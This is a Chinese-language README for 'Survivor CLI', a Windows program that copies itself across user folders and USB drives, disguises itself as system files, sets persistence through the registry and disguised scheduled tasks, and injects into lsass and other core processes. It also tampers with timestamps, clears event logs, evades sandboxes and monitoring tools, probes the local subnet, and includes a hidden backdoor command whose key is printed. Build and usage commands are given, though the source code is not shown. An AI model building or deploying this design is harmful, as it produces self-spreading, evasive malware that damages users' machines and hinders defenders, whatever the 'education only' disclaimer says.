# Survivor CLI

**Version 2.1.0** | 一个永不被删除的CLI工具，会自动复制、移动、重命名自己，散布到系统各处，并在后台持续运行自我修复和扩散机制。

**警告：此工具仅供学习和研究使用。作者不对任何滥用行为负责。**

---

## 功能特性

### 核心能力

| 功能 | 描述 |
|------|------|
| **自复制** | 复制自身到任意指定路径 |
| **自移动** | 将自身移动到新位置并在新位置继续运行 |
| **自重命名** | 伪装成系统文件名（svchost.exe, rundll32.exe等） |
| **自删除/恢复** | 删除当前实例，从其他副本恢复 |
| **环境变量操作** | 添加/移除PATH中的自身目录 |
| **开机自启** | 通过注册表Run键和计划任务实现启动时运行 |

### 新增高级功能 (v2.1.0)

| 功能 | 描述 |
|------|------|
| **时间戳篡改 (Timestomping)** | 复制文件时随机生成系统文件的时间戳，隐藏真实活动时间 |
| **备用数据流 (ADS)** | 在每个副本创建NTFS备用数据流标记，用于识别自身 |
| **计划任务隐藏** | 除注册表Run键外，还通过伪装计划任务实现持久化 |
| **完整性验证** | 内置校验和计算，支持 `--verify` 命令验证自身是否被篡改 |
| **FNV-1a哈希** | 计算并显示文件的FNV-1a哈希值 |
| **分析环境检测** | 检测沙箱、分析环境、虚拟机 |

### 自主行为（后台守护进程模式）

当无参数启动时，会自动运行以下后台线程：

| 线程 | 功能 | 间隔 |
|------|------|------|
| **SpreadingLoop** | 随机复制/移动/重命名到用户目录 | 30s-5min |
| **MonitoringLoop** | 检测副本失踪，立即多点反击恢复 | 500ms |
| **RestorationLoop** | 定期检查并恢复失踪的副本 | 30s |
| **GuardianLoop** | 注入到关键系统进程，监控并重新注入 | 5min |
| **USBScanLoop** | 检测USB插入，自动扩散到U盘 | 5s |
| **CleanupLoop** | 清理日志文件和系统事件日志 | 30min |

### 智能目标选择

扩散时会优先选择以下目录：
- `%USERPROFILE%\Downloads`
- `%USERPROFILE%\Documents`
- `%USERPROFILE%\Desktop`
- `%APPDATA%\Local\Temp`
- `%APPDATA%\Microsoft\Windows`
- `%LOCALAPPDATA%\Microsoft\Windows`
- `%APPDATA%\.cache`
- `%LOCALAPPDATA%\.config`
- `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
- `%USERPROFILE%\AppData\Local\Microsoft\Windows\INetCache`

### 环境感知

- **VM检测**：在虚拟机中运行时，自动将扩散间隔延长10倍（降低活动频率）
- **监控检测**：检测到Procmon、Process Hacker、Wireshark等工具时，自动进入静默模式（不输出日志）
- **分析环境检测**：检测沙箱名称、恶意软件分析标记，计算机关机等
- **极端谨慎模式**：当检测到分析环境时，扩散间隔延长50倍

### 进程注入

支持注入到以下系统进程（隐藏自身）：
- `csrss.exe`, `smss.exe`, `wininit.exe`, `services.exe`
- `lsass.exe`, `winlogon.exe`, `dwm.exe`, `explorer.exe`

注入后作为远程线程在目标进程中运行，难以被检测和终止。

### USB自动扩散

- 检测可移动磁盘插入
- 自动复制自身到U盘
- 创建伪装autorun.inf（社会工程学伪装，Windows 10+已禁用autoplay）
- 复制README.exe等诱饵文件

### 网络发现

- 10%概率触发网络扫描
- 探测本地子网（192.168.x.2-19）
- 尝试IPC$连接测试远程管理共享

### 日志清理

- 定期删除 `%APPDATA%`, `%LOCALAPPDATA%`, `C:\Windows\Temp`, `C:\Windows\Logs` 下的 `.log` 和 `.tmp` 文件
- 1/5概率清空系统和应用程序事件日志

### 时间戳篡改 (Timestomping)

复制文件后自动设置随机生成的过去时间戳：
- 2020-2024年之间的随机日期
- 隐藏真实活动时间

### 备用数据流 (ADS)

每个副本创建以下ADS：
- `:Zone.Identifier` - 伪装为从互联网下载
- `:marker` - 用于识别自身

---

## 命令行接口

### 基础用法

```bash
survivor.exe [command] [arguments]
```

### 可用命令

| 命令 | 描述 | 示例 |
|------|------|------|
| *(无参数)* | 以守护进程模式启动 | `survivor.exe` |
| `copy <path>` | 复制自身到目标路径 | `survivor.exe copy C:\temp\test.exe` |
| `move <path>` | 移动自身到目标路径 | `survivor.exe move D:\tools\survivor.exe` |
| `rename <name>` | 重命名当前实例 | `survivor.exe rename svchost.exe` |
| `hide` | 删除自身，从备份恢复 | `survivor.exe hide` |
| `env --add` | 添加当前目录到PATH | `survivor.exe env --add` |
| `env --remove` | 从PATH移除当前目录 | `survivor.exe env --remove` |
| `plant` | 设置开机自启（注册表+计划任务） | `survivor.exe plant` |
| `status` | 显示详细状态 | `survivor.exe status` |
| `summon` | 列出所有已知实例 | `survivor.exe summon` |
| `sync` | 同步所有实例到最新版本 | `survivor.exe sync` |
| `check` | 检查并恢复失踪的实例 | `survivor.exe check` |
| `spread` | 手动触发一次扩散 | `survivor.exe spread` |
| `hide-now` | 紧急隐藏（等同于hide） | `survivor.exe hide-now` |
| `guardian` | 立即注入到关键进程 | `survivor.exe guardian` |
| `version` | 显示版本信息 | `survivor.exe version` |
| `verify` | 验证完整性和校验和 | `survivor.exe verify` |
| `--help` | 显示帮助信息 | `survivor.exe --help` |

### 隐藏命令

| 命令 | 描述 | 密钥 |
|------|------|------|
| `ilovecwj <key>` | 紧急后门：删除所有实例 | `cwj_rocks_2026` |

**注意**: `ilovecwj` 命令不会在 `--help` 中显示。

---

## 构建

### 环境要求

- MinGW g++ 17+
- CMake 3.10+
- Windows SDK

### 编译步骤

```bash
# 创建构建目录
mkdir build
cd build

# 配置CMake
cmake -G "MinGW Makefiles" ..

# 编译
mingw32-make

# 运行
./survivor.exe --help
```

### CMakeLists.txt 依赖

```cmake
target_link_libraries(survivor PRIVATE shell32 advapi32 iphlpapi)
```

---

## 测试指南

### 重要警告

**强烈建议在隔离环境中测试此工具。** 它会自动扩散并难以完全清除。

### 推荐：虚拟机测试

1. 使用 VirtualBox 或 VMware 创建 Windows 虚拟机
2. 在测试前创建快照
3. 在虚拟机中运行测试
4. 测试完成后还原快照，清除所有痕迹

### 手动测试步骤

#### 1. 基本功能测试

```batch
# 查看帮助
survivor.exe --help

# 查看版本
survivor.exe version

# 查看状态
survivor.exe status

# 验证完整性
survivor.exe verify

# 复制到临时目录
survivor.exe copy C:\temp\survivor_test.exe
```

#### 2. 检查ADS和Timestomping

```batch
# 检查文件时间戳
dir C:\temp\survivor_test.exe

# 检查ADS（备用数据流）
more < C:\temp\survivor_test.exe:marker
```

#### 3. 后门命令测试

```batch
# 错误密钥应该失败
survivor.exe ilovecwj wrong_key

# 正确密钥会删除所有实例
survivor.exe ilovecwj cwj_rocks_2026
```

#### 4. 检查注册表（开机自启）

```batch
# 检查Run键
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor

# 检查计划任务伪装
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck
```

### 清理测试残留

#### 删除所有实例

```batch
# 使用后门
survivor.exe ilovecwj cwj_rocks_2026
```

#### 手动清理注册表

```batch
# 删除开机自启
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f

# 删除环境变量（如果添加了）
reg delete "HKCU\Environment" /v Path
```

#### 清理实例注册文件

```batch
# 删除AppData中的注册表
rmdir /s /q "%APPDATA%\survivor"
```

---

## 技术细节

### 文件结构

```
C:\code\cli\
├── CMakeLists.txt          # CMake构建配置
├── survivor.cpp             # 源代码（单文件实现，约1370行）
├── LICENSE                  # MIT许可证
├── README.md                # 本文档
└── build\
    └── survivor.exe         # 编译产物
```

### 注册表存储

实例列表存储在（XOR加密）：
```
%APPDATA%\survivor\instances.json
```

格式：
```json
{
  "instances": [
    "C:\\path\\to\\instance1.exe",
    "C:\\path\\to\\instance2.exe"
  ],
  "last_sync": "2026-04-25T10:30:00Z",
  "version": "2.1.0",
  "checksum": 12345678
}
```

### 全局配置

```cpp
struct Config {
    int spread_interval_min = 30;       // 最小扩散间隔（秒）
    int spread_interval_max = 300;      // 最大扩散间隔（秒）
    int monitor_interval_ms = 500;      // 监控检查间隔（毫秒）
    int restore_interval_sec = 30;     // 恢复检查间隔（秒）
    int guardian_interval_min = 5;     // 进程守护间隔（分钟）
    int usb_scan_interval_sec = 5;     // USB扫描间隔（秒）
    int cleanup_interval_min = 30;     // 日志清理间隔（分钟）
    int counterattack_count = 5;       // 反删除爆发生成数量
    bool enable_timestomping = true;   // 是否启用时间戳篡改
    bool enable_ads = true;            // 是否启用ADS标记
    bool enable_scheduled_task = true;  // 是否启用计划任务伪装
    bool enable_event_log_cleaning = true; // 是否清理事件日志
} g_config;
```

### 全局变量

```cpp
std::atomic<bool> g_running{true};      // 控制后台线程
std::atomic<bool> g_daemon{false};      // 是否守护模式
std::atomic<bool> g_spreading{false};   // 是否扩散中
double g_spread_interval_multiplier = 1.0; // 扩散间隔乘数（VM/分析检测时增加）
bool g_verbose = true;                  // 是否输出日志（监控检测时关闭）
```

### 后台线程架构

```
main()
├── Parse --daemon, --verbose, --quiet flags
├── if no args -> StartDaemon()
│   ├── AdjustBehaviorBasedOnEnvironment()  // VM/监控/分析环境检测
│   ├── RegisterInstance()                 // 注册自身
│   ├── CreateScheduledTask()              // 创建计划任务伪装
│   ├── SpreadingLoop()      [独立线程]     // 随机扩散
│   ├── MonitoringLoop()     [独立线程]     // 500ms检测删除，爆发生成
│   ├── RestorationLoop()   [独立线程]     // 30s恢复副本
│   ├── GuardianLoop()      [独立线程]     // 5min进程守护，重新注入
│   ├── USBScanLoop()       [独立线程]     // 5s检测USB
│   └── CleanupLoop()       [独立线程]     // 30min清理日志
└── else -> 处理命令
```

### 自传播机制

当 `SafeCopy()` 成功复制到新位置时：
1. 设置 `FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM`
2. 注册新实例到 `instances.json`
3. 应用Timestomping随机时间戳
4. 创建ADS标记（`:Zone.Identifier` 和 `:marker`）
5. 如果 `g_spreading` 为true，启动新线程延迟5秒后以 `--daemon` 参数启动新副本

### 反删除机制

`MonitoringLoop()` 每500ms检查一次：
1. 统计 `instances.json` 中有多少实例失踪
2. 如果有实例失踪且自身可访问，立即在5个随机用户目录爆发复制（反击）
3. 尝试恢复所有失踪的实例
4. 如果自身失踪，从其他实例重新启动

### 完整性验证

```cpp
// FNV-1a哈希
std::string ComputeFileHash(const std::string& path);

// 校验和
int ComputeChecksum(const std::string& path);

// 验证命令输出
=== Verification ===
Binary: C:\path\to\survivor.exe
Hash (FNV-1a): 1a2b3c4d
Checksum: ABCD1234
Stored checksum: ABCD1234
Match: YES

Instances: 5 alive, 0 dead
```

---

## 安全说明

### 此工具的能力

- 可以在系统各处创建自身副本
- 可以注入到系统进程
- 可以修改PATH环境变量
- 可以设置开机自启（注册表+计划任务）
- 难以被完全清除（有多个副本互相恢复）
- 会在后台持续运行
- 可以篡改文件时间戳
- 可以创建NTFS备用数据流

### 潜在风险

1. **难以删除**: 多个副本互相监控，一个被删其他会恢复
2. **资源占用**: 后台线程会持续消耗CPU和内存
3. **网络活动**: 会进行网络扫描（虽然目前只是探测）
4. **行为可疑**: 被杀毒软件检测

### 使用限制

- **禁止**在生产环境或他人设备上使用
- **禁止**用于任何非法目的
- 此工具仅作为学习Windows系统编程和进程行为的教育目的

---

## 卸载方法

### 正常卸载

```batch
# 使用后门（需要密钥）
survivor.exe ilovecwj cwj_rocks_2026
```

### 手动卸载

```batch
# 1. 停止所有实例（需要找到并逐个删除）

# 2. 删除注册表
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f

# 3. 清理AppData
rmdir /s /q "%APPDATA%\survivor"

# 4. 恢复PATH（如果env --add被使用）
# 需要手动编辑环境变量
```

---

## 版本历史

| 版本 | 日期 | 描述 |
|------|------|------|
| 1.0.0 | 2026-04-25 | 初始版本：基础copy/move/rename/plant功能 |
| 2.0.0 | 2026-04-25 | 添加自主行为：后台守护线程、自我修复、智能目标选择 |
| 2.1.0 | 2026-04-25 | 添加Timestomping、ADS、计划任务伪装、完整性验证、分析环境检测 |

---

## 密钥

```
cwj_rocks_2026
```

用于 `ilovecwj` 命令，调用后门删除所有实例。

---

**最后更新**: 2026-04-25
**请勿滥用**